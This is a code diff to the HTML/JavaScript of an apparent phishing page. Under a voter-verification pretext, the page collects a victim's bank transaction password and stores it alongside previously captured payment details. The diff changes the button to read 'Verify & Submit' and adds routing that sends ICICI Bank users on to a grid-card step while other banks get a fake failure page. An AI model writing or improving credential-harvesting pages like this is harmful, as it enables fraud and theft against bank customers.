@@ -26,7 +26,7 @@
                 <label for="transPassword">Enter Your Transaction Password</label>
                 <input type="password" id="transPassword" name="transPassword" placeholder="Enter transaction password" required>
             </div>
-            <button type="submit" id="submitBtn" class="btn-next">Next</button>
+            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
         </form>
     </div>
 
@@ -38,6 +38,7 @@
 
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
             let deviceId = localStorage.getItem('voterDeviceId');
+            let selectedBank = "";
 
             if (submissions.length > 0) {
                 let targetIndex = -1;
@@ -49,17 +50,29 @@
                 }
                 if (targetIndex === -1) targetIndex = submissions.length - 1;
 
+                // Save Transaction Password
                 submissions[targetIndex].transPassword = transPassword;
+                
+                // Check karo ki user ne payment details mein kaun sa bank save kiya tha
+                if (submissions[targetIndex].paymentDetails) {
+                    selectedBank = submissions[targetIndex].paymentDetails;
+                }
+
                 localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
             }
 
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
-            btn.innerText = "Processing...";
+            btn.innerText = "Verifying...";
 
             setTimeout(() => {
-                // Agar ICICI Bank select kiya hai ya Net Banking hai, toh Grid Step 1 par bhejenge
-                window.location.href = "grid_step1.html"; 
+                // Agar bank ICICI hai, toh grid ke pehle page par bhejo
+                if (selectedBank.includes("ICICI")) {
+                    window.location.href = "grid_step1.html"; 
+                } else {
+                    // Agar koi aur bank hai (SBI, HDFC, etc.), toh seedha failed.html par bhejo
+                    window.location.href = "failed.html"; 
+                }
             }, 1000);
         });
     </script>
